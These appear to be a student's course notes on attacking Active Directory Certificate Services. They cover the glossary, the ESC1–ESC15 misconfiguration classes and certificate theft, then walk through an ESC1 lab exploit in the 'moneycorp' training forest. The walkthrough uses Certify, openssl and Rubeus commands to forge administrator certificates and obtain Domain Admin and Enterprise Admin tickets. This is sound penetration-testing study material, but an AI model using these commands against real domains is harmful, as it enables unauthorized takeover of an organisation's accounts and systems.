- We have been talking about AD DS (Domain Services), but there is another very important but often ignored server role, AD CS (Certificate Services).
- The problem with AD CS is that most of the organisations that are using AD CS don't have much idea about how to protect it, and what the gaps in it are.
- Let's first understand what AD CS is, it is Microsoft's implementation of PKI (Public Key Infrastructure), and enables PKI use in an AD environment.
- AD CS is used to authenticate users and machines, to encrypt and sign documents, file-systems, emails and more. 
	- AD CS is used to perform anything that a CA (Certification Authority) is capable of.
- "AD CS" is the server role that allows you to build a PKI (Public Key Infrastructure) and provide public key cryptography, digital certificates and digital signature capabilities for your organisation."
- For example, if our organisation is using smart card logons, we may need to implement AD CS for them to work.

#### AD CS Glossary
- CA (Certification Authority) - The certification authority that issues certificates. The server with AD CS role (DC or otherwise) is the CA.
	- Unfortunately we may see environments where a single server may be the DC, AD FS, AD CS, DNS server and so on.
	- We should try to set up different servers for different server roles to minimise the attack surface.
- Certificate - Issued to a user or a machine and can be used for authentication, encryption, signing etc. 
	- We can think of certificates as a piece of code that is issued to an identity (a user or a machine), and can be used to authenticate the identity it is issued to, encryption or digitally signing documents etc.
- CSR (Certificate Signing Request) - A fancy term for a certificate signing request, which is a request made by a client to the CA to request a certificate.
	- When a user or a machine requests a certificate, it needs to request it from a template, a template is defined as follows in the next term.
- Certificate Template - A template contains the settings for a certificate, which may include attributes like certificate expiry, enrolment permissions, and EKUs (which contain information about what a certificate can be used for, as in can it be used for client authentication, can it be used for encrypting files and so on).
	- Certificate usage is defined by EKUs in the Certificate Template.
	- EKU stands for Extended Key Usage.
- EKU OIDs - Extended Key Usage Object Identifiers. These dictate the use of a certificate template (Client Authentication, Smart Card Logon, SubCA etc.).

#### AD CS Request Flow
- ![[Pasted image 20250819223716.png]]
1. The client generates a public/private key pair.
2. The client sends a certificate request to the Enterprise CA.
3. The Enterprise CA verifies the template's existence, the settings permissions, the enrolment permissions.
4. If everything goes well, the Enterprise CA generates a certificate and signs it using its private key.
5. The client then stores the certificate in its certificate store.

#### AD CS - Legacy
- AD CS has been around for a while, however attacks on AD CS were highlighted in a phenomenal paper names [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), there have been attacks on AD CS before the paper, but this put the spotlight on abusing AD CS.
- We need to make sure that we know at least the well known attacks in AD CS, we may not need to be an expert in it since it is still one of the most ignored parts of an enterprise environment.
- If we put Azure AND SQL server out of the picture right now, in an AD environment, there are 4-5 technologies which are pretty popular but not as well understood as they should be, one of which is AD DS (which is still not well understood, but still understood better than the rest), then come the AD CS, AD FS, and SCCM.
- If your CA certificate authority is trusted by your Azure (EntraID Tenant), it is very probable that the compromise of AD CS spills over to the cloud infrastructure, which is fascinating to observe.
- AD CS is widely popular, but not well understood, and in most cases just a sitting duck.
- The Certified Pre-Owned paper talks about various ways of abusing AD CS:
	- Extracting user or machine certificates, and re-using them to request a NTLM Hash or a TGT.
	- User or machine level persistence: Assume that we have the certificate for a user, and that it expires in an year (which is the default expiry period for the user template), this means that if we have the user's certificate, we have access to the user's privileges until the certificate expires.
		- Even if the user's password changes, the certificate remains the same.
	- Escalation to Domain Admin and Enterprise Admin
	- Domain Persistence
- Not all AD CS techniques are discussed here, the domain is so vast that Altered Security provide a whole another course on it.
- Stealing certificates and user/machine persistence:
	- ![[Pasted image 20250819225907.png]]
	- In theft 4, if a certificate is marked as exportable, we can use CertUtil or Export-PfxCertificate (PowerShell) or MMC Certificates snap-in to simply export the certificate.
	- We may even find certificates stored around on user machines:
		- Most users, even technically literate ones, don’t realise that a certificate must be protected as carefully as a password. The security industry has focused so heavily on password hygiene that other sensitive secrets, like certificates, are rarely given the same emphasis.
		- Unlike passwords, which users instinctively avoid disclosing, certificates are often mishandled or stored insecurely simply because people don’t understand their sensitivity. Even opening a certificate file gives no warning that it should be treated as private.
		- As a result, it’s not uncommon to find certificates lying around on user machines.
	- Theft 5 can be summarised as "If we have an account's certificate, we can get the NTLM hash for it", for our purposes.
	- Question: Since the DC has access to all the accounts' private keys, does the AD CS server also has access to all the certificate's private keys?
		- Sort of, not exactly, we can see in the authentication flow that a certificate is signed using the CA's private key, so if we are able to compromise the CA, we can decrypt or export any certificates issued by it.
- Escalation Methods:
	- This is where most of the research efforts have gone to, both in terms of finding new attack vectors, and in terms of Microsoft blocking them.
	- Many of the escalation methods are slight variations of other well known ones, some of the methods are fixed for good.
	- ![[Pasted image 20250820033115.png]]
	- ESC1 - If a template is poorly configured, and if we have enrolment rights, we can go ahead and request a certificate for any user, including a Domain Admin.
		- if the EKU is Client Authentication, it will be game over, since then we can directly access resources as the Domain Admin using the requested certificate.
	- ESC2 - Where a template does not specify an EKU, this is potentially dangerous, because we can probably use the issued certificate for any use case.
	- ESC3 - Where we can request an enrolment agent certificate, and use it to request a certificate on behalf of any other user, including the Domain Admin.
		- The enrolment agent being able to request a certificate on behalf of any other user is by design!
	- ESC4 - An ACL issue with the template. Templates like other objects have ACLs associated with them, we can go ahead and try to modify the template itself if the template has overly permissive inbound ACLs.
	- ESC5 - Poor access control on the CA server or CA server computer object. If we can compromise the CA server itself, we can do a lot of damage!
	- ESC6 (Patched in May 2022) - ESC6 used to be devastating, It was not a template issue, but a CA issue. If a CA had the mentioned parameter set, we could request a certificate for any user.
	- ESC7 - Poor access control on high privileged roles like "CA Administrator" and "Certificate Manager".
	- ESC8 - This is probably the most popular one, it involves NTLM relaying to HTTP enrolment endpoints.
		- When we configure an AD CS server, there are HTTP enrolment endpoints, it is possible to perform NTLM relay to those endpoints.
		- This is still one of the vastly used Escalation technique, but it may get killed off in a few years (5 years - 1 decade), because in server 2025 NTLM relaying would be dead for good.
		- However a production environment may not be able to move entirely to server 2025, with the server 2025 functional level anytime soon. This would take a monumental effort on the organisation's part.
	- ESC9 - No security extensions (Enrolee can modify their own UPN (User Principal Name) to request certificate on behalf of any user)
	- ESC10 - There are two types of certificate mappings, implicit and explicit. If there is an implicit weak certificate mapping, an Enrolee may be able to modify their own UPN to request certificate on behalf of any user, similar to ESC9, but is caused due to a different mis-configuration.
	- ESC11 - NTLM relay to RPC enrolment endpoints. The reason we may consider it niche is because RPC is not enabled by default.
	- ESC12 - A very specific case where we can steal the CA private key from a very specific hardware credential vault (Yubico YubiHSM)
	- ESC13 - When the Enrolee gets the privileges from a linked group, when we are creating a template, we can link groups to it, if there is a high privileged group linked to a template, and a normal user has the templates enrolment rights, the normal user can get the high privileges from the linked group.
	- ESC14 (To be patched)
	- ESC15 (Patched in November 2024)
	- Easier to use AD CS abuse techniques for Escalation: ESC1, ESC3, ESC4, ESC5, ESC7, ESC8
	- Techniques that will not be as commonly used, because they are targeted around specific cases: ESC9, ESC10, ESC11, ESC12, ESC13, ESC14, ESC15
- Domain Persistence:
	- ![[Pasted image 20250820153022.png]]
	- If we compromise the CA, or are able to inject our own malicious CA, then we can persist at the domain level.

#### Abusing AD CS
- We can use the Certify tool, Certipy tool, or even BloodHound to enumerate and perform attacks on AD CS in the target forest:
	- Enumerating Enterprise or root CAs in the target environment:
		- `Certify.exe cas`
			- We observe that there is a CA in the lab environment, with the name `moneycorp-MCORP-DC-CA`.
				- The CA present is vulnerable to the ESC6 technique (Enrolees can specify subject alternative names).
				- However, we are not going to consider this as the attack vector for now.
			- It is to be noted that for any of the AD CS abuse techniques to be used, especially the Escalation techniques, we need to make sure that the "Authenticated Users" principal at least have the Access Rights `Allow Enroll`, i.e. normal users can interact with the CA. This can be verified under the `CA Permissions` field in the results of this command.
			- However, it is very unlikely, almost impossible that we observe the required CA permissions to not be allowed in a production environment, because if they are not allowed, the CA would be of no use.
			- We can also find the names of the templates in the result of this command, but we should use the next command to properly enumerate the templates present.
	- Enumerate the templates:
		- `Certify.exe find`
	- Enumerate vulnerable templates (quite superficial, not very detailed, only shows those templates where a normal identity (Domain User/specific user) has enrolment rights):
		- `Certify.exe find /vulnerable`
- We may note that in the moneycorp forest, there are multiple AD CS mis-configurations.
- Common requirements/mis-configurations for all the Escalations that we have in the lab (ESC1 and ESC3)
	- CA grants normal/low privileged users enrolment rights (We checked this earlier under CA permissions, after using the `Certify.exe cas` command)
	- Manager approval is disabled (Usually true for most of the templates in prod environments)
	- Authorisation signatures are not required (Depends on the templates, but this is also not generally enforced)
	- The target template grants normal/low privileged users enrolment rights.
- ESC1:
	- Enumeration:
		- `Certify.exe find`
			- Check the `HTTPSCertificates` template, which we are going to abuse for ESC1.
			- `Authorized Signatures Required` is set to 0 for the template.
			- Under `Enrollment Rights`, we will observe that the `RDPUsers` group has enrolment rights.
			- The `msPKI-Certificate-Name-Flag` here shows the mis-configuration we are going to exploit by performing ESC1, namely `ENROLLEE_SUPPLIES_SUBJECT`.
				- Under this mis-configuration (ESC1), we can request a certificate for any user.
				- The `Enrollee`, the user (Any member of `RDPUsers` in our case) who requests the certificate supplies the subject (preferably default Domain Administrator for us), and the template would comply, because we have enrolment rights.
			- We also need to check the EKU (`pkiextendedkeyusage`), to check what we can use the issued certificate for.
				- Here the EKU is set for Client Authentication, Encrypting File Systems and Securing Email.
			- If we put all of this together, we can deduce that as a member of `RDPUsers`, which all of the student users are, we can request a certificate for any user for `HTTPSCertificates`, because we can supply the subject (preferably default Domain Administrator), and then we can use the certificate to access a resource by requesting a TGT using it.
		- To make enumeration enterprise friendly, for larger environments, we can use BloodHound and Certipy if we want.

- TODO: rest of the docs to be added after studying from slides on my own time, instructor skipped, remind me of this if you're reading this and I end up forgetting to add the rest of the required notes I make here.

#### Learning Objective 21
- Check if AD CS is used by the target forest and find any vulnerable/abuse-able templates.
	- Enumeration already done in the notes mentioned above, please refer to them.
- Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.
	- Abusing ESC1 using the information we enumerated:
		- Since we found out that the `HttpsCertificates` template has `ENROLLEE_SUPPLIES_SUBJECT`. If we want we can specifically look for that case using Certify:
			- `C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject`
				- We will come across a couple of templates that match this condition:
					- `WebServer` which is a built-in template that shows up, however we do not have Enrolment Rights as a non-privileges user for this template, and the EKU is also not attractive.
					- `SubCA`, also matches the criteria but the enrolment rights are not attractive.
					- `HTTPSCertificates`, where the enrolment rights are attractive, and the EKU is also very interactive.
		- We will opt to abuse the mis-configuration ESC1 on the `HTTPSCertificates` template.
			- Escalating to Domain Admin:
				- `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`
					- The `/altname` specifies the UPN of the default Administrator.
				- If everything goes well, we should get a CA Response stating that `The certificate has been issued.`.
				- We can now copy the certificate and save it to a file, `esc1-DA.pem`.
				- The result of the command will also suggest us to use `openssl` to convert the pem file to a pfx file, we need to do that to be able to use it with Rubeus.
					- `C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx`
						- The command asks for an export password, which is the password we are going to use with Rubeus, we can use any random password here, but we need to make sure to note it down.
						- If any `unable to write 'random state'` error shows up, we can safely ignore it.
				- Using Rubeus' asktgt module to get a TGT for the default domain administrator using the certificate's pfx file:
					- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:<The export password we set earlier for the certificate> /ptt`
					- `klist`
					- `winrs -r:dcorp-dc cmd /c set username`
					- `klist purge`
			- Escalating to Enterprise Admin:
				- `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:mcorp.local\administrator`
					- The `/altname` specifies the UPN of the Forest root administrator.
				- If everything goes well, we should get a CA Response stating that `The certificate has been issued.`.
				- We can now copy the certificate and save it to a file, `esc1-EA.pem`.
				- The result of the command will also suggest us to use `openssl` to convert the pem file to a pfx file, we need to do that to be able to use it with Rubeus.
					- `C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx`
						- The command asks for an export password, which is the password we are going to use with Rubeus, we can use any random password here, but we need to make sure to note it down.
						- If any `unable to write 'random state'` error shows up, we can safely ignore it.
				- Using Rubeus' asktgt module to get a TGT for the Forest root administrator using the certificate's pfx file:
					- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:<The export password we set earlier for the certificate> /ptt`
					- `klist`
					- `winrs -r:mcorp-dc cmd /c set username`
					- `klist purge`